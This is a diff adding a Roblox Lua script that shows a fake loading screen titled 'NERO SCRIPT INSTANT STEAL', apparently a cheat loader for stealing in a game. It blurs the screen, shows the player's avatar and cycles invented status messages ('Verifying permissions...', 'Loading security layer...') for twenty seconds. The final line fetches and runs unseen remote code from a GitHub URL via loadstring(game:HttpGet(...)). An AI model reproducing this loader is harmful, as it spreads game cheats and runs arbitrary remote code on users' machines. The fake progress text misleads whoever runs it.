@@ -1,1 +1,189 @@
-asdasdas
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+
+local Player = Players.LocalPlayer
+
+pcall(function()
+	StarterGui:SetCore("TopbarEnabled", false)
+end)
+
+if Lighting:FindFirstChild("FullScreenBlur") then
+	Lighting.FullScreenBlur:Destroy()
+end
+
+local Blur = Instance.new("BlurEffect")
+Blur.Name = "FullScreenBlur"
+Blur.Size = 45
+Blur.Parent = Lighting
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 999
+ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+
+local Overlay = Instance.new("Frame")
+Overlay.Size = UDim2.fromScale(1,1)
+Overlay.BackgroundColor3 = Color3.fromRGB(6,8,22)
+Overlay.BackgroundTransparency = 0.25
+Overlay.BorderSizePixel = 0
+Overlay.Parent = ScreenGui
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.fromOffset(520,280)
+Main.Position = UDim2.fromScale(0.5,0.5)
+Main.AnchorPoint = Vector2.new(0.5,0.5)
+Main.BackgroundColor3 = Color3.fromRGB(14,18,40)
+Main.BorderSizePixel = 0
+Main.Parent = Overlay
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0,18)
+
+--------------------------------------------------
+-- LOADING UI DIRECTLY
+--------------------------------------------------
+
+-- CENTERED TITLE
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Parent = Main
+LoadingTitle.Size = UDim2.new(1,-40,0,30)
+LoadingTitle.Position = UDim2.new(0,20,0,25)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Text = "NERO SCRIPT INSTANT STEAL"
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextSize = 22
+LoadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
+LoadingTitle.TextXAlignment = Enum.TextXAlignment.Center
+
+-- AVATAR
+local content = Players:GetUserThumbnailAsync(
+	Player.UserId,
+	Enum.ThumbnailType.HeadShot,
+	Enum.ThumbnailSize.Size150x150
+)
+
+local Avatar = Instance.new("ImageLabel")
+Avatar.Parent = Main
+Avatar.Size = UDim2.fromOffset(60,60)
+Avatar.Position = UDim2.new(0.5,-30,0,65)
+Avatar.BackgroundTransparency = 1
+Avatar.Image = content
+Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
+
+-- Loading Text
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Parent = Main
+LoadingLabel.Size = UDim2.new(1,-60,0,30)
+LoadingLabel.Position = UDim2.new(0,30,0.55,-20)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.TextColor3 = Color3.fromRGB(180,190,255)
+LoadingLabel.Font = Enum.Font.Gotham
+LoadingLabel.TextSize = 14
+LoadingLabel.Text = "Starting..."
+LoadingLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Progress Bar
+local BarBG = Instance.new("Frame")
+BarBG.Parent = Main
+BarBG.Size = UDim2.new(1,-80,0,18)
+BarBG.Position = UDim2.new(0,40,0.65,0)
+BarBG.BackgroundColor3 = Color3.fromRGB(25,30,70)
+BarBG.BorderSizePixel = 0
+Instance.new("UICorner", BarBG).CornerRadius = UDim.new(1,0)
+
+local Bar = Instance.new("Frame")
+Bar.Parent = BarBG
+Bar.Size = UDim2.new(0,0,1,0)
+Bar.BackgroundColor3 = Color3.fromRGB(120,90,255)
+Bar.BorderSizePixel = 0
+Instance.new("UICorner", Bar).CornerRadius = UDim.new(1,0)
+
+--------------------------------------------------
+-- LOADING MESSAGES
+--------------------------------------------------
+local messages = {
+	"Initializing system...",
+	"Validating server link...",
+	"Checking connection...",
+	"Syncing player data...",
+	"Preparing environment...",
+	"Loading secure modules...",
+	"Establishing session...",
+	"Verifying permissions...",
+	"Optimizing performance...",
+	"Applying configurations...",
+	"Connecting to server...",
+	"Securing connection...",
+	"Fetching resources...",
+	"Finalizing setup...",
+	"Almost ready...",
+	"Loading assets...",
+	"Preparing interface...",
+	"Synchronizing data...",
+	"Calibrating systems...",
+	"Loading modules...",
+	"Processing request...",
+	"Building environment...",
+	"Starting services...",
+	"Checking status...",
+	"Validating session...",
+	"Applying updates...",
+	"Refreshing data...",
+	"Loading components...",
+	"Optimizing scripts...",
+	"Preparing runtime...",
+	"Connecting services...",
+	"Scanning environment...",
+	"Authenticating...",
+	"Launching modules...",
+	"Initializing framework...",
+	"Syncing services...",
+	"Loading configuration...",
+	"Stabilizing system...",
+	"Verifying data...",
+	"Preparing execution...",
+	"Starting processes...",
+	"Connecting nodes...",
+	"Loading security layer...",
+	"Validating request...",
+	"Final checks...",
+	"Establishing secure link...",
+	"System readying...",
+	"Completing setup...",
+	"Finishing initialization...",
+	"Done..."
+}
+
+--------------------------------------------------
+-- START LOADING IMMEDIATELY
+--------------------------------------------------
+local totalTime = 20
+local startTime = tick()
+
+task.spawn(function()
+	local index = 1
+	while tick() - startTime < totalTime do
+		LoadingLabel.Text = messages[index]
+		index += 1
+		if index > #messages then
+			index = 1
+		end
+		task.wait(0.08)
+	end
+end)
+
+local tween = TweenService:Create(
+	Bar,
+	TweenInfo.new(totalTime, Enum.EasingStyle.Linear),
+	{Size = UDim2.new(1,0,1,0)}
+)
+tween:Play()
+tween.Completed:Wait()
+
+Main:Destroy()
+Blur:Destroy()
+ScreenGui:Destroy()
+
+print("Loading main script...")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NeroHubClub/SabInstantEstel/refs/heads/main/nroeoo"))()
